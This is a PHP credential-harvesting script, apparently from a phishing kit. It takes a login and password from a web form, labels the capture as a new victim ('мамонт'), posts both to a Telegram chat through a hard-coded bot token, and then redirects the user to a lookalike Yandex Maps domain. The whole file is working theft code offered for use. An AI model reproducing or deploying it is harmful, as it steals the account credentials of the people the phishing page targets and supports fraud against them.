<?php

/* https://api.telegram.org/bot6462876068:AAHVOvICnLERQ2_HHM5FknVeX8D5bDBTj0Y/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

$username = $_POST['username'];
$password = $_POST['password'];
$token = "6462876068:AAHVOvICnLERQ2_HHM5FknVeX8D5bDBTj0Y";
$chat_id = "-4261887112";
$arr = array(
  '<b>Новый мамонт!</b>',
  'Логин: ' => $username,
  'Пароль: ' => $password,
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: https://yandex-karta-kr.ru/bc/sprutYUoYdwJgQEAEQFtofXhydXhnZA=sat&ll=531502572C52434567&z');
} else {
  echo "Error";
}
?>